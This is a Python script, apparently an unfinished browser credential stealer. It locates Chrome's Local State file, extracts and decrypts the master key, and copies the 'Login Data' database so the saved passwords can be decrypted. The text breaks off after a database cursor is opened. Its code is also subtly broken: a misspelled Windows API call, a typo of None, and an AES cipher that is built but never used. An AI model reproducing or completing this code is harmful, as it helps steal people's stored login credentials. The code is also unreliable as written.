import os,json,base64,sqlite3,win32crypt,shutil
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta

def get_readable_date(chromedate):
    return datetime(year=1601, month=1, day=1) + timedelta(microseconds=chromedate)

def encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectedData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    iv = password[3:15]
    password = password[15:]

    cipher = AES.new(key, AES.MODE_GCM, iv)

    return str(win32crypt.CryptUnprotectedData(password, NOne, None, None, 0)[1])

def main():
    key = encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    
